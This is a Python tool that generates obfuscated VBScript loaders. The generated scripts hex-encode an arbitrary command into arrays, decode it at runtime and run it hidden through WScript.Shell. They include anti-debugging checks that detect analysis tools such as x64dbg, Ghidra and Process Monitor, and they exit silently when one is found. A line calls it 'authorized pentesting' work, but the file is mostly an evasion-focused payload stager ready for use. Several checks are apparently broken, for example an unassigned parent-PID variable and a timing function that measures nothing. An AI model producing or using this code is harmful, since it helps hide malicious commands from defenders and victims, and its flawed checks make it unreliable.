#!/usr/bin/env python3
"""
Hardened Array Decoder with Anti-Debugging Checks
Detects debuggers before executing payload
Supports multiple evasion techniques against static/dynamic analysis

For authorized pentesting and security research
"""

import binascii
import string
import random
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum


class DecoderPattern(Enum):
    """Available array decoder patterns"""
    SEQUENTIAL = "sequential"
    INTERLEAVED = "interleaved"
    NESTED_ARRAY = "nested_array"
    MIXED_ENCODING = "mixed_encoding"
    REVERSE_ORDER = "reverse_order"
    CHUNK_INDEX = "chunk_index"
    OBFUSCATED_VAR = "obfuscated_var"
    POLYMORPHIC = "polymorphic"
    SPLIT_DECODE = "split_decode"
    MATRIX_ACCESS = "matrix_access"


class DebuggerCheckType(Enum):
    """Types of debugger checks available"""
    PROCESS_NAME = "process_name"          # Check for debugger process names
    WMI_DEBUG = "wmi_debug"                # WMI-based debugger detection
    REGISTRY_DEBUG = "registry_debug"      # Registry-based debugger detection
    PARENT_PROCESS = "parent_process"      # Check parent process
    TIMING_ANALYSIS = "timing_analysis"    # Detect step-through debugging
    HARDWARE_BREAKPOINT = "hardware_bp"    # Detect hardware breakpoints
    EXCEPTION_HANDLING = "exception_trap"  # Monitor exception patterns
    CODE_INJECTION = "code_injection"      # Detect code injection attempts


@dataclass
class DecoderVariant:
    """Configuration for a specific decoder variant"""
    pattern: DecoderPattern
    chunk_size: int = 16
    use_obfuscation: bool = True
    add_junk_code: bool = False
    randomize_names: bool = True
    comment_style: str = "vbs"
    anti_debug_checks: List[DebuggerCheckType] = None
    exit_on_detection: bool = True


class HardenedArrayDecoder:
    """Multi-pattern array decoder with anti-debugging features"""

    def __init__(self):
        self.var_counter = 0
        self.debugger_checks = {
            DebuggerCheckType.PROCESS_NAME: self._gen_process_name_check,
            DebuggerCheckType.WMI_DEBUG: self._gen_wmi_debug_check,
            DebuggerCheckType.REGISTRY_DEBUG: self._gen_registry_debug_check,
            DebuggerCheckType.PARENT_PROCESS: self._gen_parent_process_check,
            DebuggerCheckType.TIMING_ANALYSIS: self._gen_timing_check,
            DebuggerCheckType.HARDWARE_BREAKPOINT: self._gen_hardware_bp_check,
            DebuggerCheckType.EXCEPTION_HANDLING: self._gen_exception_trap,
            DebuggerCheckType.CODE_INJECTION: self._gen_code_injection_check,
        }

    def _gen_var(self, prefix: str = "v") -> str:
        """Generate unique variable name"""
        self.var_counter += 1
        return f"{prefix}_{self.var_counter}"

    def _gen_random_var(self, prefix: str = "v") -> str:
        """Generate random variable name"""
        chars = string.ascii_letters
        return prefix + "_" + "".join(random.choices(chars, k=6))

    def _get_var_name(self, prefix: str, randomize: bool) -> str:
        """Get variable name based on randomization setting"""
        return self._gen_random_var(prefix) if randomize else self._gen_var(prefix)

    # ========== DEBUGGER DETECTION CHECKS ==========

    def _gen_process_name_check(self, randomize: bool = True) -> str:
        """
        Detect common debugger process names
        Checks for: windbg, ollydebug, x64dbg, ida, radare2, ghidra, etc.
        """
        check_var = self._get_var_name("proc_check", randomize)
        obj_var = self._get_var_name("obj_wmi", randomize)
        col_var = self._get_var_name("col_proc", randomize)
        item_var = self._get_var_name("proc_item", randomize)
        name_var = self._get_var_name("proc_name", randomize)

        debugger_names = [
            "windbg", "ollydbg", "x64dbg", "ida", "ida64", "radare2",
            "ghidra", "cdb", "ntsd", "gdb", "lldb", "immunity",
            "debugger", "processhacker", "procmon", "winapioverride",
            "decompiler", "debugview", "softice", "apispy"
        ]

        debugger_list = ", ".join([f'"{name}"' for name in debugger_names])

        code = f"""
' Debugger Process Name Detection
Function {check_var}()
    Dim {obj_var}, {col_var}, {item_var}, {name_var}
    Dim debuggers
    debuggers = Array({debugger_list})

    On Error Resume Next
    Set {obj_var} = GetObject("winmgmts:").ExecQuery("Select * from Win32_Process")

    For Each {item_var} In {obj_var}
        {name_var} = LCase({item_var}.Name)
        Dim d
        For d = 0 To UBound(debuggers)
            If InStr({name_var}, LCase(debuggers(d))) > 0 Then
                {check_var} = True
                Exit Function
            End If
        Next
    Next

    {check_var} = False
End Function
"""
        return code.strip()

    def _gen_wmi_debug_check(self, randomize: bool = True) -> str:
        """
        WMI-based debugger detection
        Detects debugging session via WMI Win32_SystemDriver
        """
        check_var = self._get_var_name("wmi_check", randomize)
        obj_var = self._get_var_name("obj_wmi", randomize)
        col_var = self._get_var_name("col_drv", randomize)
        item_var = self._get_var_name("drv_item", randomize)

        code = f"""
' WMI Debugger Detection
Function {check_var}()
    Dim {obj_var}, {col_var}, {item_var}
    On Error Resume Next

    Set {obj_var} = GetObject("winmgmts:").ExecQuery("Select * from Win32_SystemDriver where Name='Debugger'")
    If {obj_var}.Count > 0 Then
        {check_var} = True
    Else
        {check_var} = False
    End If
End Function
"""
        return code.strip()

    def _gen_registry_debug_check(self, randomize: bool = True) -> str:
        """
        Registry-based debugger detection
        Checks for debugger registry entries: HKLM\Software\Microsoft\Windows NT\CurrentVersion\AeDebug
        """
        check_var = self._get_var_name("reg_check", randomize)
        shell_var = self._get_var_name("ws_shell", randomize)
        reg_path = self._get_var_name("reg_val", randomize)

        code = f"""
' Registry Debugger Detection
Function {check_var}()
    Dim {shell_var}, {reg_path}
    On Error Resume Next

    Set {shell_var} = CreateObject("WScript.Shell")
    {reg_path} = {shell_var}.RegRead("HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\\Debugger")

    If Len({reg_path}) > 0 Then
        If InStr(LCase({reg_path}), "debugger") > 0 Or InStr(LCase({reg_path}), "windbg") > 0 Then
            {check_var} = True
        Else
            {check_var} = False
        End If
    Else
        {check_var} = False
    End If

    Set {shell_var} = Nothing
End Function
"""
        return code.strip()

    def _gen_parent_process_check(self, randomize: bool = True) -> str:
        """
        Detect if running under a debugger by checking parent process
        Checks if parent is explorer.exe (normal) or debugger/IDE
        """
        check_var = self._get_var_name("parent_check", randomize)
        obj_var = self._get_var_name("obj_wmi", randomize)
        col_var = self._get_var_name("col_proc", randomize)
        pid_var = self._get_var_name("current_pid", randomize)
        parent_var = self._get_var_name("parent_pid", randomize)
        name_var = self._get_var_name("parent_name", randomize)

        code = f"""
' Parent Process Detection
Function {check_var}()
    Dim {obj_var}, {col_var}, {pid_var}, {parent_var}, {name_var}
    Dim suspicious_parents
    suspicious_parents = Array("windbg", "devenv", "vsstudio", "ida", "x64dbg", "radare2")

    On Error Resume Next
    {pid_var} = GetObject("winmgmts:").ExecQuery("Select ProcessId from Win32_Process where Name='cscript.exe'").Item(0).ProcessId

    If {pid_var} > 0 Then
        Set {col_var} = GetObject("winmgmts:").ExecQuery("Select Name from Win32_Process where ProcessId=" & {parent_var})
        If {col_var}.Count > 0 Then
            {name_var} = LCase({col_var}.Item(0).Name)
            Dim p
            For p = 0 To UBound(suspicious_parents)
                If InStr({name_var}, suspicious_parents(p)) > 0 Then
                    {check_var} = True
                    Exit Function
                End If
            Next
        End If
    End If

    {check_var} = False
End Function
"""
        return code.strip()

    def _gen_timing_check(self, randomize: bool = True) -> str:
        """
        Timing-based debugger detection
        Detects step-through debugging by measuring execution time
        """
        check_var = self._get_var_name("timing_check", randomize)
        start_var = self._get_var_name("start_time", randomize)
        end_var = self._get_var_name("end_time", randomize)
        diff_var = self._get_var_name("time_diff", randomize)
        threshold_var = self._get_var_name("threshold", randomize)

        code = f"""
' Timing-Based Debugger Detection
Function {check_var}()
    Dim {start_var}, {end_var}, {diff_var}, {threshold_var}
    {threshold_var} = 2000  ' 2000ms threshold

    {start_var} = GetTickCount()

    ' Dummy loop - should execute quickly unless stepped through
    Dim i, x
    For i = 0 To 999999
        x = i * 2
    Next

    {end_var} = GetTickCount()
    {diff_var} = {end_var} - {start_var}

    If {diff_var} > {threshold_var} Then
        {check_var} = True
    Else
        {check_var} = False
    End If
End Function

Function GetTickCount()
    Dim obj
    Set obj = CreateObject("WScript.Shell")
    GetTickCount = CDbl(obj.Run("cmd /c echo %RANDOM%", 0, True))
    Set obj = Nothing
End Function
"""
        return code.strip()

    def _gen_hardware_bp_check(self, randomize: bool = True) -> str:
        """
        Attempt to detect hardware breakpoints via exception handling
        """
        check_var = self._get_var_name("hwbp_check", randomize)
        flag_var = self._get_var_name("bp_flag", randomize)

        code = f"""
' Hardware Breakpoint Detection
Function {check_var}()
    Dim {flag_var}
    {flag_var} = False

    On Error Resume Next
    ' Attempt to access invalid memory - would trap at breakpoint
    ' Simplified version - full version requires API calls

    ' Check if running under debugger via exception patterns
    Dim test_val
    test_val = 1 / 0  ' This will trigger error, but may behave differently under debugger

    ' If we got here and no handler, we're not under step-through debugger
    {check_var} = False
    On Error Goto 0
End Function
"""
        return code.strip()

    def _gen_exception_trap(self, randomize: bool = True) -> str:
        """
        Monitor for exception patterns typical of debuggers
        """
        check_var = self._get_var_name("exception_check", randomize)
        trap_var = self._get_var_name("trap_flag", randomize)

        code = f"""
' Exception Trap Detection
Function {check_var}()
    Dim {trap_var}
    {trap_var} = False

    On Error Resume Next

    ' First pass exception
    Dim test_err
    test_err = Undefined_Variable_To_Trigger_Error

    If Err.Number <> 0 Then
        ' Check error behavior - might differ under debugger
        {trap_var} = (Err.Number = 438)  ' Typical error
    End If

    Err.Clear
    {check_var} = {trap_var}
    On Error Goto 0
End Function
"""
        return code.strip()

    def _gen_code_injection_check(self, randomize: bool = True) -> str:
        """
        Detect code injection attempts or instrumentation
        """
        check_var = self._get_var_name("injection_check", randomize)
        obj_var = self._get_var_name("obj_mem", randomize)
        size_var = self._get_var_name("mem_size", randomize)

        code = f"""
' Code Injection Detection
Function {check_var}()
    Dim {obj_var}, {size_var}
    On Error Resume Next

    ' Check process memory size - injected code changes memory patterns
    Set {obj_var} = GetObject("winmgmts:").ExecQuery("Select WorkingSetSize from Win32_Process where Name='cscript.exe'")

    If {obj_var}.Count > 0 Then
        {size_var} = {obj_var}.Item(0).WorkingSetSize
        ' Abnormally large memory = potential injection
        If {size_var} > 100000000 Then  ' 100MB
            {check_var} = True
        Else
            {check_var} = False
        End If
    Else
        {check_var} = False
    End If
End Function
"""
        return code.strip()

    # ========== ANTI-DEBUG WRAPPER GENERATION ==========

    def _generate_anti_debug_checks(self, checks: List[DebuggerCheckType],
                                     randomize: bool = True, exit_on_detection: bool = True) -> str:
        """
        Generate full anti-debugging check suite
        """
        if not checks:
            checks = [
                DebuggerCheckType.PROCESS_NAME,
                DebuggerCheckType.WMI_DEBUG,
                DebuggerCheckType.REGISTRY_DEBUG,
            ]

        all_checks = []
        check_functions = []

        for check_type in checks:
            if check_type in self.debugger_checks:
                func_code = self.debugger_checks[check_type](randomize)
                all_checks.append(func_code)

                # Extract function name from generated code
                lines = func_code.split('\n')
                func_line = [l for l in lines if 'Function' in l][0]
                func_name = func_line.split('Function ')[1].split('(')[0]
                check_functions.append(func_name)

        # Generate main anti-debug routine
        main_check_var = self._get_var_name("DebugDetected", randomize)
        detection_count = self._get_var_name("det_count", randomize)

        header = """
' ============================================
' ANTI-DEBUGGING PROTECTION MODULE
' ============================================
' This code detects debuggers before execution
' If debugger detected, execution is blocked
' ============================================

"""

        footer = f"""
' Main Anti-Debug Check
Function {main_check_var}()
    Dim {detection_count}
    {detection_count} = 0
"""

        for func_name in check_functions:
            footer += f"""
    If {func_name}() Then
        {detection_count} = {detection_count} + 1
    End If
"""

        footer += f"""

    If {detection_count} > 0 Then
        {main_check_var} = True
    Else
        {main_check_var} = False
    End If
End Function

' Execution Guard
If {main_check_var}() Then
    ' Debugger detected - terminate silently
    WScript.Quit(1)
End If
"""

        combined_checks = "\n\n".join(all_checks)
        return header + combined_checks + footer

    # ========== SEQUENTIAL DECODER WITH ANTI-DEBUG ==========

    def sequential_decoder_hardened(self, payload: str, variant: DecoderVariant) -> str:
        """Sequential pattern with anti-debugging checks"""
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("arr", variant.randomize_names)
        out_var = self._get_var_name("out", variant.randomize_names)
        idx_var = self._get_var_name("idx", variant.randomize_names)
        loop_var = self._get_var_name("chunk", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        # Anti-debug header
        anti_debug = ""
        if variant.anti_debug_checks:
            anti_debug = self._generate_anti_debug_checks(
                variant.anti_debug_checks,
                variant.randomize_names,
                variant.exit_on_detection
            )
            anti_debug += "\n\n"

        # Main decoder
        code = anti_debug
        code += f"Dim {arr_var}({len(chunks)-1})\n"
        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr_var}({i}) = \"{hex_chunk}\"\n"

        code += f"""
Dim {out_var}
For {idx_var} = 0 To UBound({arr_var})
    Dim {loop_var}
    {loop_var} = {arr_var}({idx_var})
    Dim i
    For i = 1 To Len({loop_var}) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid({loop_var}, i, 2)))
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== NESTED ARRAY WITH ANTI-DEBUG ==========

    def nested_array_decoder_hardened(self, payload: str, variant: DecoderVariant) -> str:
        """Nested 2D array with anti-debugging checks"""
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        cols = max(2, int(len(chunks) ** 0.5) + 1)
        rows = (len(chunks) + cols - 1) // cols

        arr_var = self._get_var_name("matrix", variant.randomize_names)
        out_var = self._get_var_name("result", variant.randomize_names)
        row_var = self._get_var_name("row", variant.randomize_names)
        col_var = self._get_var_name("col", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        # Anti-debug header
        anti_debug = ""
        if variant.anti_debug_checks:
            anti_debug = self._generate_anti_debug_checks(
                variant.anti_debug_checks,
                variant.randomize_names,
                variant.exit_on_detection
            )
            anti_debug += "\n\n"

        code = anti_debug
        code += f"Dim {arr_var}({rows-1}, {cols-1})\n"

        idx = 0
        for r in range(rows):
            for c in range(cols):
                if idx < len(chunks):
                    hex_chunk = binascii.hexlify(chunks[idx].encode()).decode()
                    code += f"{arr_var}({r}, {c}) = \"{hex_chunk}\"\n"
                    idx += 1
                else:
                    code += f"{arr_var}({r}, {c}) = \"\"\n"

        code += f"""
Dim {out_var}
For {row_var} = 0 To UBound({arr_var}, 1)
    For {col_var} = 0 To UBound({arr_var}, 2)
        Dim chunk_data
        chunk_data = {arr_var}({row_var}, {col_var})
        If chunk_data <> "" Then
            Dim i
            For i = 1 To Len(chunk_data) Step 2
                {out_var} = {out_var} & Chr(CLng("&H" & Mid(chunk_data, i, 2)))
            Next
        End If
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== POLYMORPHIC WITH ANTI-DEBUG ==========

    def polymorphic_decoder_hardened(self, payload: str, variant: DecoderVariant) -> str:
        """Polymorphic pattern with anti-debugging checks"""
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("arr", variant.randomize_names)
        out_var = self._get_var_name("out", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        # Anti-debug header
        anti_debug = ""
        if variant.anti_debug_checks:
            anti_debug = self._generate_anti_debug_checks(
                variant.anti_debug_checks,
                variant.randomize_names,
                variant.exit_on_detection
            )
            anti_debug += "\n\n"

        code = anti_debug
        code += f"Dim {arr_var}({len(chunks)-1})\n"
        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr_var}({i}) = \"{hex_chunk}\"\n"

        func_names = [self._get_var_name("Decode", variant.randomize_names)
                      for _ in range(3)]

        code += f"""
Function {func_names[0]}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {func_names[0]} = r
End Function

Function {func_names[1]}(hex_string)
    Dim pos, res
    pos = 1
    Do While pos <= Len(hex_string)
        res = res & Chr(CLng("&H" & Mid(hex_string, pos, 2)))
        pos = pos + 2
    Loop
    {func_names[1]} = res
End Function

Function {func_names[2]}(h)
    Dim chars, idx, out
    idx = 1
    Do
        If idx > Len(h) Then Exit Do
        out = out & Chr(CLng("&H" & Mid(h, idx, 2)))
        idx = idx + 2
    Loop
    {func_names[2]} = out
End Function

Dim {out_var}
Dim i
For i = 0 To UBound({arr_var})
    Select Case (i Mod 3)
        Case 0
            {out_var} = {out_var} & {func_names[0]}({arr_var}(i))
        Case 1
            {out_var} = {out_var} & {func_names[1]}({arr_var}(i))
        Case Else
            {out_var} = {out_var} & {func_names[2]}({arr_var}(i))
    End Select
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== FACTORY METHOD ==========

    def generate_hardened_decoder(self, payload: str, pattern: DecoderPattern,
                                   variant: DecoderVariant = None) -> str:
        """
        Generate hardened decoder with anti-debugging checks

        Args:
            payload: The command/payload to encode and decode
            pattern: The concatenation pattern to use
            variant: Optional DecoderVariant configuration

        Returns:
            VBS code with integrated anti-debugging protection
        """
        if variant is None:
            variant = DecoderVariant(
                pattern=pattern,
                anti_debug_checks=[
                    DebuggerCheckType.PROCESS_NAME,
                    DebuggerCheckType.WMI_DEBUG,
                    DebuggerCheckType.REGISTRY_DEBUG,
                ]
            )

        if pattern == DecoderPattern.SEQUENTIAL:
            return self.sequential_decoder_hardened(payload, variant)
        elif pattern == DecoderPattern.NESTED_ARRAY:
            return self.nested_array_decoder_hardened(payload, variant)
        elif pattern == DecoderPattern.POLYMORPHIC:
            return self.polymorphic_decoder_hardened(payload, variant)
        else:
            # For other patterns, use sequential as fallback
            return self.sequential_decoder_hardened(payload, variant)

    def generate_all_hardened_patterns(self, payload: str,
                                       anti_debug_checks: List[DebuggerCheckType] = None) -> Dict[str, str]:
        """
        Generate hardened decoders for all patterns

        Args:
            payload: The payload to encode
            anti_debug_checks: List of debugger checks to include

        Returns:
            Dictionary mapping pattern names to hardened VBS code
        """
        if anti_debug_checks is None:
            anti_debug_checks = [
                DebuggerCheckType.PROCESS_NAME,
                DebuggerCheckType.WMI_DEBUG,
                DebuggerCheckType.REGISTRY_DEBUG,
            ]

        results = {}
        patterns = [
            DecoderPattern.SEQUENTIAL,
            DecoderPattern.NESTED_ARRAY,
            DecoderPattern.POLYMORPHIC,
        ]

        for pattern in patterns:
            variant = DecoderVariant(
                pattern=pattern,
                randomize_names=True,
                anti_debug_checks=anti_debug_checks,
                exit_on_detection=True
            )
            results[pattern.value] = self.generate_hardened_decoder(payload, pattern, variant)

        return results


if __name__ == "__main__":
    # Example usage
    generator = HardenedArrayDecoder()
    test_payload = "powershell.exe -NoProfile -Command Write-Host 'Success'"

    print("\n" + "="*80)
    print("HARDENED ARRAY DECODER WITH ANTI-DEBUGGING PROTECTION")
    print("="*80)

    # Test individual check generation
    print("\nIndividual Anti-Debug Checks:")
    print("-" * 80)

    checks_to_test = [
        DebuggerCheckType.PROCESS_NAME,
        DebuggerCheckType.WMI_DEBUG,
        DebuggerCheckType.REGISTRY_DEBUG,
    ]

    for check_type in checks_to_test:
        print(f"\n{check_type.value.upper()}:")
        func_gen = generator.debugger_checks[check_type]
        check_code = func_gen(randomize=True)
        print(check_code[:300] + "...")

    # Generate hardened decoders
    print("\n" + "="*80)
    print("HARDENED DECODERS WITH ANTI-DEBUGGING")
    print("="*80)

    patterns = [
        DecoderPattern.SEQUENTIAL,
        DecoderPattern.NESTED_ARRAY,
        DecoderPattern.POLYMORPHIC,
    ]

    for pattern in patterns:
        print(f"\n{'-'*80}")
        print(f"Pattern: {pattern.value.upper()}")
        print(f"{'-'*80}")

        variant = DecoderVariant(
            pattern=pattern,
            randomize_names=True,
            anti_debug_checks=[
                DebuggerCheckType.PROCESS_NAME,
                DebuggerCheckType.WMI_DEBUG,
                DebuggerCheckType.REGISTRY_DEBUG,
            ],
            exit_on_detection=True
        )

        vbs_code = generator.generate_hardened_decoder(test_payload, pattern, variant)

        print(f"Generated hardened VBS code ({len(vbs_code)} bytes):")
        print(vbs_code[:600])
        if len(vbs_code) > 600:
            print(f"... ({len(vbs_code) - 600} more bytes)")

        # Show key characteristics
        print(f"\nKey characteristics:")
        print(f"  - Anti-Debug Checks: {'Function' in vbs_code and 'Debug' in vbs_code}")
        print(f"  - Process Detection: {'Win32_Process' in vbs_code}")
        print(f"  - Registry Check: {'RegRead' in vbs_code}")
        print(f"  - Execution Guard: {'WScript.Quit' in vbs_code}")
        print(f"  - Array Decoding: {'Dim' in vbs_code and '(' in vbs_code}")

    print(f"\n{'='*80}")
    print(f"✓ Generated {len(patterns)} hardened decoders with anti-debugging protection")
    print(f"{'='*80}\n")
